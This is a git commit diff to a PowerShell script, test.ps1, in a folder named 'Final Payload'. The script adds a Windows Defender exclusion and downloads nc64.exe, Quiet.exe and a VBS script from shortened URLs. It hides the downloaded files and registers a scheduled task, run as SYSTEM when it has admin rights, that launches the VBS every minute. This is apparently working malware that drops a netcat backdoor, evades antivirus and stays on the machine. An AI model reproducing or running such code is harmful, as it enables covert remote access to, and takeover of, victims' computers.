a54e24fd7778f31a80ab23c1647641a7cbc97d1a
AKSHAT Singh <84120105+ShorterKing@users.noreply.github.com>
2024-08-14 21:20:27 +0530

    Update test.ps1

--- Final Payload/test.ps1
+++ Final Payload/test.ps1
@@ -3,17 +3,11 @@ $isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.Windo
 
 if ($isAdmin) {
     Write-Output "Running as Administrator"
-
-    # Admin rights detected
     $installPath = "C:\Windows"
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
-
-    # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
 } else {
     Write-Output "Not running as Administrator"
-
-    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
@@ -28,7 +22,7 @@ $quietTxtPath = Join-Path $installPath "Quiet.exe"
 $nc64TxtPath = Join-Path $installPath "nc64.exe"
 $scriptVbsPath = Join-Path $installPath "script.vbs"
 
-# URLs for Quiet.exe and nc64.exe
+# URLs for files
 $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
 
@@ -37,7 +31,7 @@ Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -UseBasicParsing
 Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -UseBasicParsing
 Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -UseBasicParsing
 
-# Make all the downloaded files hidden
+# Make downloaded files hidden
 $filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
 foreach ($file in $filesToHide) {
     attrib +H $file
@@ -45,7 +39,8 @@ foreach ($file in $filesToHide) {
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
+$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
@@ -54,14 +49,10 @@ try {
     if ($isAdmin) {
         # If admin rights, run as NT AUTHORITY\SYSTEM
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-
-        # Register the task with SYSTEM account
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
     } else {
         # If not admin, create the task with the current user's context
         $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
-
-        # Register the task without the -User parameter (Fix from the first script)
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
     }
 
